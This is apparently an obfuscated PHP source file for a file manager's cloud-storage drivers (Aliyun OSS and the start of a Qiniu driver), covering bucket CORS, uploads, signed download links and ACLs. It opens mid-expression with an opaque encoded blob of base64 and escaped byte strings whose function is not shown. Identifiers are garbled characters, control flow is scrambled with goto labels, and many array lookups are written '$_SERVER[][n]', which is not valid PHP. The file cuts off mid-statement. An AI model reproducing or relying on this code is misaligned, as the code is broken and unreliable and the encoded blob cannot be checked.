鑙pvJuR鲻{YS').base64_decode('khHOxGzHUVwAt1wglziwQUmEl+LnwBbFabw5kwNwfA/WDC9F2d0HlH0ceM/D2Q==')."\360\111\163\7\314\213\150\171\364\333\244\231\46\45\25\100\44\107\45\21\7\6\67\56\207\240\104\0\102\374\242\3\102\21\235\275\43\174\103\164\1\5\311\215\34\224"."\x6\xc3\xa\xce\x45\xd4\xc4\x12\x81\x67\xfa\x2c\x22\xee\x4b\xe4\x1a\xad\xa5\x60\xbb\xb\xe4\x9\x40\xc2\x8b\x6b\xc3\xd4\xb1\x18\x34\xc6\xe4\xfd\xe1\xf\xad\xca\x76\x2e\x8b\x5f\xe5\x13"."\174\23\125\42\220\311\253\341\306\71\156\342\235\325\211\332\160\22\257\36\175\364\205\24\122\35\73\210\147\252\200\77\327\2\71\56\344\115\140\257\215\350\244\7\372\57"."\365\55\362\207\43\341\242\254\116\117\70\334\35\14\171\261\223\307\242\154\124\113\320\76\51\312\352\154\13\166\214\225\347\153\367\370\3\105\171\120\33\245\43\306\175\321".base64_decode('4Cx/J+qlJxAIdo/VC3/zfN4TdNvJz6PzaY0eLtNj+7CcoYKuYMelZLlTIl7HKg==')."\xbf\x8b\xf3\x6a\x50\xef\x5c\x2c\x60\x75\x85\x6e\x53\xc\xa3\x8\x4b\x1a\x82\x9a\x24\x1d\xa4\xed\x50\x9e\xa4\x42\xa7\x97\x6c\x71\x33\x4e\x16\xd\x48\x54\x40\x43\x2\x5f\xbe\x60\x7f\xce"."\0\337\256\11\165\60\377\140\271\47\26\322\321\172\102\124\110\300\123\161\207\105\11\123\113\2\125\74\365\54\76\205\107\271\34\150\160\60\47\322\67\243\372\264\270\160"."\312\216\145\17\142\163\105\246\101\320\60\302\141\222\375\177\0\63\160\270\302\374\233\0\0".base64_decode('').base64_decode('')."".""."".strrev('')."", 10, -8))); goto f; FƱܜ: class PathDriverOOS extends PathDriverBaseS3 { public function __construct($A) { parent::__construct($A); $this->signatureVersion($_SERVER[][210]); } public function fileOutLink($D) { $c򧒽 =& $_SERVER[]; if (substr($D, 0, 7) == $c򧒽[1201]) { $D = $c򧒽[1202] . substr($D, 7); } header($c򧒽[158] . $D); die; } } class PathDriverOSS extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $bucket = ''; protected $bucketAcl = ''; protected $endpoint = null; protected $client = null; public $ioUploadServer = "\60"; public $ioFileOutServer = "\60"; public $cdnHost = ''; public function __construct($C) { parent::__construct(); include_once SDK_DIR . $_SERVER[][1256]; $this->_init($C); } public function _init($eξݢ) { $bХͪ =& $_SERVER[]; foreach ($eξݢ as $e => $bܢ) { if (isset($this->{$e})) { $this->{$e} = $bܢ; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($bХͪ[1257] . LNG($bХͪ[1258])); } $this->client = new OSS\OssClient($this->accessKey, $this->secret, $this->domain); $this->client->setConnectTimeout(60); } public function setBucketCors() { goto aꂫ; A߷ڱ: $bҼӽ->addAllowedMethod($bă[1262]); $bҼӽ->addAllowedMethod($bă[1263]); $bҼӽ->addAllowedMethod($bă[157]); goto c; aꂫ: $bă =& $_SERVER[]; $Fք = new OSS\Model\CorsConfig(); $bҼӽ = new OSS\Model\CorsRule(); goto Bۈ; c: $bҼӽ->setMaxAgeSeconds(600); $bҼӽ->addExposeHeader($bă[1264]); $bҼӽ->addAllowedHeader($bă[1259]); goto bƢ; Bۈ: $bҼӽ->addAllowedOrigin($bă[1259]); $bҼӽ->addAllowedMethod($bă[1260]); $bҼӽ->addAllowedMethod($bă[1261]); goto A߷ڱ; bƢ: $Fք->addRule($bҼӽ); try { $this->client->putBucketCors($this->bucket, $Fք); } catch (OSS\Core\OssException $aԏ̙) { return !1; } return !0; goto B; B: } public function getBucketCors() { goto FÑ; FÑ: $aڸ =& $_SERVER[]; $b = null; try { $b = $this->client->getBucketCors($this->bucket); } catch (OSS\Core\OssException $c󥏚) { return null; } goto A; eڹ: return array($aڸ[181] => isset($EȘ񉜎[0]) ? $EȘ񉜎[0] : $aڸ[33], $aڸ[185] => $c, $aڸ[1265] => $e΃, $aڸ[1266] => isset($EĄڵ[0]) ? $EĄڵ[0] : $aڸ[33], $aڸ[183] => isset($dփ[0]) ? $dփ[0] : $aڸ[33]); goto b; A: if (!$b || !($eѯù = $b->getRules())) { return null; } $EȘ񉜎 = $eѯù[0]->getAllowedOrigins(); $c = $eѯù[0]->getAllowedMethods(); goto E̍ھ; E̍ھ: $e΃ = $eѯù[0]->getMaxAgeSeconds(); $EĄڵ = $eѯù[0]->getExposeHeaders(); $dփ = $eѯù[0]->getAllowedHeaders(); goto eڹ; b: } public function isBucketCors() { goto b; d񲣄: if ($f[$dۑǲ[181]] != $dۑǲ[182] || $f[$dۑǲ[183]] != $dۑǲ[182]) { return !1; } $f♿ = array_map($dۑǲ[184], $f[$dۑǲ[185]]); if (!is_array($f♿)) { $f♿ = array(); } goto e靸; b: $dۑǲ =& $_SERVER[]; $f = $this->getBucketCors(); if (!$f || !is_array($f)) { return !1; } goto d񲣄; e靸: $Dݬ = array($dۑǲ[186], $dۑǲ[187], $dۑǲ[188], $dۑǲ[189], $dۑǲ[190]); $F = array_diff($Dݬ, $f♿); return empty($F); goto fȐ; fȐ: } public function mkfile($d, $A = '', $fܬ = REPEAT_RENAME) { $d = $this->setContent($d, $A); if ($d !== !1) { return $this->getPathOuter($d); } return !1; } public function mkdir($B, $bɊ = REPEAT_SKIP) { if ($this->_isFolder($B)) { return $this->getPathOuter($B); } try { $this->client->createObjectDir($this->bucket, $this->pathEncode($B)); } catch (OSS\Core\OssException $b脱) { return !1; } return $this->getPathOuter($B); } private function fileList($fڍ, $cܟ = '', $c؂ = 0) { goto f󺕝ޏ; C: return array($Bņ[74] => $C, $Bņ[73] => $Fв呉); goto a͚; Cڵݞ: $C = $Fв呉 = array(); while (!0) { check_abort(); $Aڠ = array($Bņ[1267] => $cܟ, $Bņ[1268] => $eԼ, $Bņ[1269] => $C, $Bņ[1270] => $Fֹ); try { $fנ = $this->client->listObjects($this->bucket, $Aڠ); } catch (OSS\Core\OssException $e񒺇) { break; } $Fֹ = $fנ->getNextMarker(); $Cي = $fנ->getObjectList(); $bۺѤ = $fנ->getPrefixList(); foreach ($Cي as $Ećؾ) { goto C粰һ; C粰һ: if ($Ećؾ->getKey() == $eԼ) { continue; } $Bɰ؏ = $Ećؾ->getKey(); $b޳ = $Ećؾ->getSize(); goto C܆; fȋ: if ($e砧ߩ) { $this->cacheMethod($Bņ[197], $Bɰ؏, $F); $this->cacheMethod($Bņ[198], $Bɰ؏, array($Bņ[77] => $b޳, $Bņ[1271] => $b޳, $Bņ[83] => strtotime($a詘), $Bņ[1272] => $a詘)); } if ($F) { $C[] = $Bɰ؏; continue; } $Fв呉[] = $f; goto Dٍ; C܆: $a詘 = $Ećؾ->getLastModified(); $f = $c؂ ? array($Bņ[28] => $Bɰ؏, $Bņ[77] => $b޳, $Bņ[195] => strtotime($a詘)) : $Bɰ؏; $F = $b޳ == 0 && substr($Bɰ؏, strlen($Bɰ؏) - 1, 1) == $Bņ[8] ? !0 : !1; goto fȋ; Dٍ: } foreach ($bۺѤ as $b愂ͤ) { $C[] = $b愂ͤ->getPrefix(); if ($e砧ߩ) { $this->cacheMethod($Bņ[197], $Bɰ؏, !0); } } if ($Fֹ === $Bņ[33]) { break; } } if ($e砧ߩ) { $this->cacheMethod($Bņ[197], $fڍ, !0); } goto C; f󺕝ޏ: $Bņ =& $_SERVER[]; $fڍ = trim($fڍ, $Bņ[8]); $eԼ = empty($fڍ) ? $Bņ[33] : $fڍ . $Bņ[8]; goto cܢ; cܢ: $Fֹ = $Bņ[33]; $C = 1000; $e砧ߩ = $this->listItemCache === !1 ? !1 : !0; goto Cڵݞ; a͚: } public function copyFile($CË, $Bƒ) { $C = $this->size($CË); if ($C < 1024 * 1024 * 1024) { try { $this->client->copyObject($this->bucket, $CË, $this->bucket, $this->pathEncode($Bƒ)); } catch (OSS\Core\OssException $b) { return !1; } return $this->getPathOuter($Bƒ); } $D⑋ = $this->multiCopyObject($CË, $Bƒ, $C); return $D⑋ ? $this->getPathOuter($Bƒ) : !1; } private function multiCopyObject($DŎʗ, $fƳ, $a˩) { $Eݙ =& $_SERVER[]; try { goto E; C̞ȸ: $e = 1; $dϊӗ = 0; $DĻ = array(); goto e; cߎы: $cﲗ = array(); foreach ($DĻ as $E => $cݵЏ) { $cﲗ[] = array($Eݙ[1277] => $E + 1, $Eݙ[1278] => $cݵЏ); } $this->client->completeMultipartUpload($this->bucket, $this->pathEncode($fƳ), $E̎, $cﲗ); goto b; E: $bܛ = array(); if ($fﳏ = $this->hashMd5($DŎʗ)) { $bܛ = array(OSS\OssClient::OSS_HEADERS => array($Eݙ[1273] => $fﳏ)); } $E̎ = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($fƳ), $bܛ); goto C̞ȸ; e: $Bϋ = 1024 * 1024 * 10; $f = $this->client->generateMultiuploadParts($a˩, $Bϋ); foreach ($f as $E => $A˻) { $cӥŷ = $dϊӗ + (int) $A˻[$Eݙ[1274]]; $b骛 = (int) $A˻[$Eݙ[333]] + $cӥŷ - 1; $CԐ = array($Eݙ[1275] => $cӥŷ, $Eݙ[1276] => $b骛); $DĻ[] = $this->client->uploadPartCopy($this->bucket, $DŎʗ, $this->bucket, $this->pathEncode($fƳ), $e, $E̎, $CԐ); $e = $e + 1; } goto cߎы; b: } catch (OSS\Core\OssException $E) { return !1; } return !0; } public function moveFile($d, $F맧) { if ($this->copyFile($d, $F맧)) { $this->remove($d); return $this->getPathOuter($F맧); } return !1; } public function delFile($FҼ) { try { $this->client->deleteObject($this->bucket, $this->pathEncode($FҼ)); } catch (OSS\Core\OssException $f֝) { return !1; } return !0; } public function delFolder($a裟) { goto CԔɆ; dӆ: if (!empty($a裟) && !in_array($dޏ, $aڱ흿[$b[74]])) { $aڱ흿[$b[74]][] = $dޏ; } $Eś = $this->delByBatch($aڱ흿[$b[73]]); if (!$Eś) { return !1; } goto EٖɌ; EٖɌ: return $this->delByBatch($aڱ흿[$b[74]]); goto b; CԔɆ: $b =& $_SERVER[]; if (!$this->exist($a裟)) { return !0; } $this->listItemCache = !1; goto F; F: $aڱ흿 = $this->fileList($a裟); $this->listItemCache = !0; $dޏ = trim($a裟, $b[8]) . $b[8]; goto dӆ; b: } private function delByBatch($dێ) { foreach (array_chunk($dێ, 1000) as $c쒉) { try { $this->client->deleteObjects($this->bucket, $c쒉); } catch (OSS\Core\OssException $B) { return !1; } } return !0; } public function rename($Dы, $d) { return $this->renameObject($Dы, $d); } private function fileInfo($cì, $a = false, $F⌄߻ = array()) { goto eؐ; eؐ: $a؞ =& $_SERVER[]; $D = array($a؞[28] => $this->pathThis($cì), $a؞[75] => $this->getPathOuter($cì), $a؞[29] => $a؞[173], $a؞[77] => isset($F⌄߻[$a؞[77]]) ? $F⌄߻[$a؞[77]] : 0, $a؞[167] => $this->ext($cì)); if ($a) { return $D; } goto E; B읛: return $D; goto e; e򺄃: if (isset($F⌄߻[$a؞[77]])) { $D[$a؞[77]] = $F⌄߻[$a؞[77]]; } if (isset($F⌄߻[$a؞[83]])) { $D[$a؞[83]] = $F⌄߻[$a؞[83]]; } if (isset($F⌄߻[$a؞[195]]) && !trim($D[$a؞[83]])) { $D[$a؞[83]] = $F⌄߻[$a؞[195]]; } goto B읛; E: $D[$a؞[192]] = $D[$a؞[83]] = 0; $D[$a؞[193]] = $D[$a؞[194]] = !0; if (empty($F⌄߻)) { $a = $this->objectMeta($cì); if (!$a) { return $D; } $F⌄߻ = array($a؞[83] => strtotime($a[$a؞[1272]]), $a؞[77] => $a[$a؞[1271]] + 0); } goto e򺄃; e: } private function folderInfo($DӉ, $a갔Ó = false, $Cܳ = array()) { goto cũ; cũ: $AʇО =& $_SERVER[]; $cʡۡ = array($AʇО[28] => $this->pathThis($DӉ), $AʇО[75] => $this->getPathOuter($AʇО[8] . $DӉ), $AʇО[29] => $AʇО[76]); if ($a갔Ó) { return $cʡۡ; } goto D㴮; D㴮: $cʡۡ[$AʇО[192]] = $cʡۡ[$AʇО[83]] = 0; $cʡۡ[$AʇО[193]] = $cʡۡ[$AʇО[194]] = !0; if (empty($Cܳ)) { $DӉ = rtrim($DӉ, $AʇО[8]) . $AʇО[8]; $EʴÄ = $this->objectMeta($DӉ); if (!$EʴÄ) { return $cʡۡ; } $Cܳ = array($AʇО[192] => $EʴÄ[$AʇО[1279]][$AʇО[1280]], $AʇО[83] => strtotime($EʴÄ[$AʇО[1272]])); } goto F; F: if (isset($Cܳ[$AʇО[83]])) { $cʡۡ[$AʇО[83]] = $Cܳ[$AʇО[83]]; } if (isset($Cܳ[$AʇО[192]])) { $cʡۡ[$AʇО[192]] = $Cܳ[$AʇО[192]]; } return $cʡۡ; goto E; E: } public function listPath($DǏ, $B鐙؉ = false) { $d鵘 =& $_SERVER[]; $bؖ = $this->fileList($DǏ, $d鵘[8], !0); foreach ($bؖ[$d鵘[74]] as $d => $DĎɜ) { $bؖ[$d鵘[74]][$d] = $this->folderInfo($DĎɜ, $B鐙؉, $DĎɜ); } foreach ($bؖ[$d鵘[73]] as $d => $DĎɜ) { $bؖ[$d鵘[73]][$d] = $this->fileInfo($DĎɜ[$d鵘[28]], $B鐙؉, $DĎɜ); } return $bؖ; } public function has($c뗵, $cۥ = false, $CӘ = true) { goto cΉκ; C: $Fȷ = $B[33]; $E蓖 = 500; $aĎ = $A = 0; goto b; cΉκ: $B =& $_SERVER[]; $c뗵 = trim($c뗵, $B[8]); $DՊǆ = empty($c뗵) ? $B[33] : $c뗵 . $B[8]; goto C; b: while (!0) { check_abort(); $Fè = array($B[1267] => $B[8], $B[1268] => $DՊǆ, $B[1269] => $E蓖, $B[1270] => $Fȷ); try { $C = $this->client->listObjects($this->bucket, $Fè); } catch (OSS\Core\OssException $Cލӥ) { break; } $Fȷ = $C->getNextMarker(); $Fܜ = $C->getObjectList(); $cӎ = $C->getPrefixList(); if ($cۥ) { if (count($Fܜ) > 1 || count($Fܜ) == 1 && $Fܜ[0]->getKey() != $DՊǆ) { $aĎ += count($Fܜ) - 1; } if (!empty($cӎ)) { $A += count($cӎ); } if ($Fȷ === $B[33]) { break; } continue; } if ($CӘ) { if (!empty($Fܜ)) { if (count($Fܜ) > 1 || $Fܜ[0]->getKey() != $DՊǆ) { return !0; } } } else { if (!empty($cӎ)) { return !0; } } if ($Fȷ === $B[33]) { break; } } if ($cۥ) { return array($B[201] => $aĎ, $B[202] => $A); } return !1; goto d; d: } public function listAll($bˈ) { $FϜ =& $_SERVER[]; $cŝ = $this->fileList($bˈ, $FϜ[33], !0); $Cʗņ = array(); foreach ($cŝ[$FϜ[73]] as $dކ) { $Cʗņ[$dކ[$FϜ[28]]] = $dކ[$FϜ[77]]; } foreach ($cŝ[$FϜ[74]] as $dކ) { if (is_string($dކ)) { $Cʗņ[$dކ] = 0; } } return $this->listAllFiles($bˈ, array_keys($Cʗņ), $Cʗņ); } public function canRead($b滺) { $c =& $_SERVER[]; $e碰 = $this->pathAcl($b滺); return $e碰 == $c[1281] || $e碰 == $c[514] ? !0 : !1; } public function canWrite($F) { $A朚 = $this->pathAcl($F); return $A朚 == $_SERVER[][514] ? !0 : !1; } public function pathAcl($aø) { goto eЭ; eЭ: $aَ =& $_SERVER[]; if (empty($this->bucketAcl)) { $this->bucketAcl = $this->client->getBucketAcl($this->bucket); } try { $d = $this->client->getObjectAcl($this->bucket, $this->pathEncode($aø)); } catch (OSS\Core\OssException $B⍱茰) { return !1; } goto Cºְ; Dˉ: return $Eǳש; goto Dᡃ; Cºְ: $Eǳש = $d == $aَ[34] ? $this->bucketAcl : $d; if ($Eǳש == $aَ[1282]) { return $aَ[1281]; } if ($Eǳש == $aَ[1283]) { return $aَ[514]; } goto Dˉ; Dᡃ: } private function chmodPath($b⽹, $aֈ = '') { $A뽃 =& $_SERVER[]; $Dʦ = empty($aֈ) ? $A뽃[1283] : $aֈ; $BЇ = array($A뽃[34], $A뽃[191], $A뽃[1282], $A뽃[1283]); if (!in_array($Dʦ, $BЇ)) { return !1; } try { $this->client->putObjectAcl($this->bucket, $this->pathEncode($b⽹), $Dʦ); } catch (OSS\Core\OssException $b) { return !1; } return !0; } public function getContent($a) { return $this->fileSubstr($a, -1); } public function setContent($Bۿ, $c㷂 = '') { $b񊭴 =& $_SERVER[]; try { $C묦 = $this->trafficLimit($b񊭴[1284]); $Cڬ̨ = $this->client->putObject($this->bucket, $this->pathEncode($Bۿ), $c㷂, $C묦); } catch (OSS\Core\OssException $EЊ׃) { return !1; } $Eą = array($b񊭴[1273] => trim($Cڬ̨[$b񊭴[1285]], $b񊭴[115]), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($Bۿ))); $this->updateObjMeta($Bۿ, $Eą); return isset($Cڬ̨[$b񊭴[1286]][$b񊭴[1232]]) ? !0 : !1; } private function updateObjMeta($cċЂ, $B쬾) { $cċЂ = $this->pathEncode($cċЂ); try { $b÷ = array(OSS\OssClient::OSS_HEADERS => $B쬾); $this->client->copyObject($this->bucket, $cċЂ, $this->bucket, $cċЂ, $b÷); } catch (OSS\Core\OssException $eҳ) { return !1; } return !0; } public function upload($aՆڡ, $b͑, $f = false, $C = REPEAT_REPLACE) { $fΌ =& $_SERVER[]; $CĎ = trim($aՆڡ, $fΌ[8]); $B֑ = array(OSS\OssClient::OSS_CHECK_MD5 => !0, OSS\OssClient::OSS_PART_SIZE => 1024 * 1024 * 10, OSS\OssClient::OSS_HEADERS => array($fΌ[1273] => @md5_file($b͑)), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($aՆڡ))); $B֑ = $this->trafficLimit($fΌ[1284], $B֑); try { $this->client->multiuploadFile($this->bucket, $this->pathEncode($CĎ), $b͑, $B֑); } catch (OSS\Core\OssException $F) { return !1; } return $this->getPathOuter($aՆڡ); } public function getHost() { $a虆ؓ =& $_SERVER[]; $e = explode($a虆ؓ[177], parent::getHost()); return $e[0] . $a虆ؓ[177] . $this->bucket . $a虆ؓ[94] . $e[1]; } public function uploadFormData($dչ, $a٩ = 3600) { goto EҶ; D: $fڬ = strpos($f, $a۫ª[292]); $f = substr($f, 0, $fڬ) . $a۫ª[1288]; $eӓק = 1048576000 * 5; goto e׷ڗ; B: return $fô; goto eԭɘ; B: $d֡ơ = date($a۫ª[1287], time() + $eؾ؂); $Eݹµ = new DateTime($d֡ơ); $f = $Eݹµ->format(DateTime::ISO8601); goto D; A욢: $a = base64_encode(hash_hmac($a۫ª[228], $f, $this->secret, !0)); $fô = array($a۫ª[1198] => $f, $a۫ª[1290] => $this->accessKey, $a۫ª[1194] => $a۫ª[1186], $a۫ª[1291] => $a, $a۫ª[175] => $f); $fô = $this->trafficLimit($a۫ª[1284], $fô); goto B; e׷ڗ: $E = $this->pathFather($dչ); $c匂 = array($a۫ª[1188] => $f, $a۫ª[1189] => array(array($a۫ª[1289], 0, $eӓק), array($a۫ª[1192], $a۫ª[1193], $E))); $f = base64_encode(json_encode($c匂)); goto A욢; EҶ: $a۫ª =& $_SERVER[]; if (!($f = $this->getHost())) { return !1; } $eؾ؂ = $a٩; goto B; eԭɘ: } public function multiUploadFormData($B蕻, $bΔ = 3600) { $fǞ =& $_SERVER[]; if (!($f̙ = $this->getHost())) { return !1; } $bѪ = $this->trafficLimit($fǞ[1284]); $BғՕ = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($B蕻), $bѪ); return array($fǞ[219] => $BғՕ, $fǞ[175] => $f̙ . $fǞ[8] . $this->pathEncode($B蕻), $fǞ[220] => gmdate($fǞ[1292]), $fǞ[92] => $B蕻); } public function multiUploadAuthData($D捌, $f鱐ƫ = array()) { goto F敻; E֥煿: $A = array($d陎[222], $d陎[33], $d陎[118], $fϟ, "\170\55\157\x73\163\55\144\x61\164\145\72{$fϟ}", $d陎[8] . $this->bucket . $d陎[8] . $bѨ . $EǓ); if (strpos($EǓ, $d陎[223]) === 0) { $A[0] = $d陎[224]; if ($D = $this->trafficLimit($d陎[1284])) { $bѨ = $d陎[1293]; array_splice($A, 5, 0, $bѨ . $d陎[4] . $D[$bѨ]); } } if (isset($f鱐ƫ[$d陎[225]]) && $f鱐ƫ[$d陎[225]] == $d陎[226]) { $A[0] = $d陎[226]; } goto b; b: if (!empty($f鱐ƫ[$d陎[1294]])) { $b泧 = array_merge(array($A[4]), $f鱐ƫ[$d陎[1294]]); sort($b泧); $A[4] = implode($d陎[227], $b泧); } $aʹ = implode($d陎[227], $A); $Eⅅ = base64_encode(hash_hmac($d陎[228], $aʹ, $this->secret, !0)); goto A֬훣; A֬훣: $A = $d陎[1257] . $this->accessKey . $d陎[4] . $Eⅅ; if (strpos($EǓ, $d陎[223]) === 0) { $A = array($d陎[230] => $A, $d陎[220] => $fϟ); if ($D) { $A = array_merge($A, $D); } } return $A; goto D; f: $bѨ = $D捌; if (isset($f鱐ƫ[$d陎[92]])) { $bѨ = $f鱐ƫ[$d陎[92]]; unset($f鱐ƫ[$d陎[92]]); } if (isset($f鱐ƫ[$d陎[221]])) { $f鱐ƫ[$d陎[220]] = $fϟ; return $this->listUploadParts($bѨ, $f鱐ƫ); } goto E֥煿; F敻: $d陎 =& $_SERVER[]; $fϟ = isset($f鱐ƫ[$d陎[220]]) ? $f鱐ƫ[$d陎[220]] : gmdate($d陎[1292]); $EǓ = isset($f鱐ƫ[$d陎[167]]) ? $f鱐ƫ[$d陎[167]] : $d陎[33]; goto f; D: } public function listUploadParts($eƢۧ, $Cȅ) { goto C젫; C젫: $A븍 =& $_SERVER[]; $e채 = parse_url_query($Cȅ[$A븍[167]]); $C̚ = $this->client->listParts($this->bucket, $this->pathEncode($eƢۧ), $e채[$A븍[219]]); goto a; E: unset($Cȅ[$A븍[221]], $Cȅ[$A븍[225]]); $Fܿ = $this->multiUploadAuthData($eƢۧ, $Cȅ); if (empty($Fܿ)) { return !1; } goto B½Ū; a: $e = $C̚->getListPart(); $eҾن = array(); foreach ($e as $Cߔ) { $eҾن[] = array($A븍[1277] => $Cߔ->getPartNumber(), $A븍[1278] => trim($Cߔ->getETag(), $A븍[115])); } goto E; B½Ū: return array($A븍[230] => $Fܿ, $A븍[220] => $Cȅ[$A븍[220]], $A븍[232] => $eҾن); goto d; d: } public function download($EÇ, $E) { if ($this->isFolder($EÇ)) { return !1; } try { $D˭ = array(OSS\OssClient::OSS_FILE_DOWNLOAD => $E); $D˭ = $this->trafficLimit($_SERVER[][108], $D˭); $this->client->getObject($this->bucket, $this->pathEncode($EÇ), $D˭); } catch (OSS\Core\OssException $Bߵ) { return !1; } return $E; } public function fileSubstr($Fܸ, $aٮ = 0, $e = false) { if ($aٮ === -1) { $f힆 = array(); } else { if ($e === !1) { $f̅ᎈ = $this->size($Fܸ); } else { $f̅ᎈ = $aٮ + $e - 1; } $f힆 = array(OSS\OssClient::OSS_RANGE => "{$aٮ}\55{$f̅ᎈ}"); } try { return $this->client->getObject($this->bucket, $this->pathEncode($Fܸ), $f힆); } catch (OSS\Core\OssException $eڪϗ) { think_exception($eڪϗ->getMessage()); return !1; } } private function trafficLimit($aӲ, $E = array()) { goto FҼ; FҼ: $Eׂ؛ =& $_SERVER[]; if ($aӲ == $Eׂ؛[1284] && $this->isUploadServer() || $aӲ == $Eׂ؛[108] && $this->isFileOutServer()) { return $E; } $d = floatval($GLOBALS[$Eׂ؛[6]][$Eׂ؛[87]][$Eׂ؛[106]][$aӲ]) * 1024 * 1024 * 8; goto E; E: if (!$d) { return $E; } $d = $d < 819200 ? 819200 : ($d > 838860800 ? 838860800 : $d); $E[OSS\OssClient::OSS_TRAFFIC_LIMIT] = intval($d); goto DҨ; DҨ: return $E; goto EР; EР: } public function link($Fȭ, $B = array()) { $a躂 =& $_SERVER[]; if (!$this->exist($Fȭ) || $this->isFolder($Fȭ)) { return !1; } try { $B = $this->trafficLimit($a躂[108], $B); $fɼ = $this->client->signUrl($this->bucket, $this->pathEncode($Fȭ), 3600 * 12, $a躂[226], $B); return $this->getCdnLink($fɼ); } catch (OSS\Core\OssException $fʶ) { return !1; } } public function fileOut($EȞ, $Aˋ = false, $FǛߤ = false, $c = '') { goto dľ; b: $Fϻ齘 = $this->link($EȞ, $DЯ); $this->fileOutLink($Fϻ齘); goto BӶ; bĒ: $FǛߤ = rawurlencode($FǛߤ); $b = get_file_mime(get_path_ext($FǛߤ)); if ($b == $eۥ㋔[211]) { return parent::fileOut($EȞ, $Aˋ, $FǛߤ, $c); } goto B; dľ: $eۥ㋔ =& $_SERVER[]; if ($this->isFileOutServer()) { return $this->fileOutServer($EȞ, $Aˋ, $FǛߤ, $c); } if (!$FǛߤ) { $FǛߤ = $this->pathThis($EȞ); } goto bĒ; B: $Aˋ = $Aˋ ? $eۥ㋔[212] : $eۥ㋔[213]; $DЯ = array(OSS\OssClient::OSS_SUB_RESOURCE => $eۥ㋔[1295] . rawurlencode("{$Aˋ}\x3b\146\151\154\145\156\141\x6d\145\75{$FǛߤ}")); $DЯ[OSS\OssClient::OSS_SUB_RESOURCE] .= $eۥ㋔[1296] . rawurlencode($b); goto b; BӶ: } public function fileOutServer($D蒚, $Fǆ߳ = false, $Aӕ = false, $c = '') { parent::fileOut($D蒚, $Fǆ߳, $Aӕ, $c); } public function fileOutImage($Bۼ, $d = 250) { $A׿ܸ΄ = array(OSS\OssClient::OSS_PROCESS => $_SERVER[][1297] . $d); $c♷ҡ = $this->link($Bۼ, $A׿ܸ΄); $this->fileOutLink($c♷ҡ); } public function fileOutImageServer($Cκݾ, $F󔨟 = 250) { parent::fileOutImage($Cκݾ, $F󔨟); } public function fileOutLink($cޝ) { $Ȇ앍 =& $_SERVER[]; if (!$this->isCdnHost() && substr($cޝ, 0, 7) == $Ȇ앍[1201]) { $cޝ = $Ȇ앍[1202] . substr($cޝ, 7); } header($Ȇ앍[158] . $cޝ); die; } public function hashMd5($a, $Eʠ = '') { $eٽǃ =& $_SERVER[]; $a = $this->_objectMeta($a); if (!$a) { return $eٽǃ[33]; } if (!isset($a[$eٽǃ[1273]]) && !empty($Eʠ)) { $cن = $this->updateObjMeta($a, array($eٽǃ[1273] => $Eʠ)); $a[$eٽǃ[1273]] = $cن ? $Eʠ : $eٽǃ[33]; } return isset($a[$eٽǃ[1273]]) ? strtolower($a[$eٽǃ[1273]]) : $eٽǃ[33]; } public function size($c޹) { $E = $this->objectMeta($c޹); return $E ? $E[$_SERVER[][77]] : 0; } public function info($eИ) { if ($this->isFolder($eИ)) { return $this->folderInfo($eИ); } else { if ($this->isFile($eИ)) { return $this->fileInfo($eИ); } } return !1; } public function exist($fТ) { return $this->isFile($fТ) || $this->isFolder($fТ); } public function isFile($c݉) { return !$this->isFolder($c݉) && $this->objectMeta($c݉); } public function isFolder($aѤ) { return $this->cacheMethod($_SERVER[][197], $aѤ); } protected function objectMeta($Dދ) { return $this->cacheMethod($_SERVER[][198], $Dދ); } protected function _objectMeta($D륌) { $dҽ =& $_SERVER[]; try { $d嵄 = $this->client->getObjectMeta($this->bucket, $this->pathEncode($D륌)); } catch (OSS\Core\OssException $c˻) { $d嵄 = !1; } if ($d嵄) { $d嵄[$dҽ[77]] = intval($d嵄[$dҽ[1271]]); } return $d嵄; } protected function _isFolder($aݿ) { $C =& $_SERVER[]; if ($aݿ == $C[33] || $aݿ == $C[8]) { return !0; } $d腙 = array($C[1267] => $C[8], $C[1268] => rtrim($aݿ, $C[8]) . $C[8], $C[1269] => 1, $C[1270] => $C[33]); $eʧߡԋ = $this->client->listObjects($this->bucket, $d腙); if ($eʧߡԋ->getObjectList() || $eʧߡԋ->getPrefixList()) { return !0; } return !1; } } class PathDriverQiniu extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $region = ''; protected $bucket = ''; protected $auth = null; protected $client = null; protected $config = null; protected $bucketManager = null; public $ioUploadServer = "\x30"; public $ioFileOutServer = "\60"; public function __construct($C˾) { parent::__construct(); require_once SDK_DIR . $_SERVER[][1298]; $this->_init($C˾); } public function _init($Fޤ) { goto c˴; Bʋ: $this->auth = new Qiniu\Auth($this->accessKey, $this->secret); $this->client = new Qiniu\Rtc\AppClient($this->auth); $this->config = new \Qiniu\Config(); goto f; c˴: $b =& $_SERVER[]; foreach ($Fޤ as $f䵨 => $B岃) { if (isset($this->{$f䵨})) { $this->{$f䵨} = $B岃; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($b[1299] . LNG($b[1258])); } goto Bʋ; f: $this->bucketManager = new \Qiniu\Storage\BucketManager($this->auth, $this->config); goto B̜; B̜: } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function mkfile($dɝ, $bə = '', $f܋ޏ = REPEAT_RENAME) { if ($this->setContent($dɝ, $bə)) { return $this->getPathOuter($dɝ); } return !1; } public function mkdir($f䧣, $f證Ǒ = REPEAT_SKIP) { goto CҙҔ; CҙҔ: $c =& $_SERVER[]; $F = trim($f䧣, $c[8]); if ($this->_isFolder($F)) { return $this->getPathOuter($F); } goto AΠ; Aґ: if (!$this->mkfile($BȦ)) { return !1; } if (!$this->moveFile($BȦ, $f䧣)) { $this->delFile($BȦ); return !1; } return $this->getPathOuter($F); goto eқǝ; AΠ: $f䧣 = $F . $c[8]; $b = get_path_this($F); $BȦ = $f䧣 . $b; goto Aґ; eқǝ: } public function copyFile($Ä́, $dﯞ) { $FԹ = $this->bucketManager->copy($this->bucket, $Ä́, $this->bucket, $dﯞ, !0); return $FԹ ? !1 : $this->getPathOuter($dﯞ); } public function moveFile($F, $Bʡվ) { $E = $this->bucketManager->move($this->bucket, $F, $this->bucket, 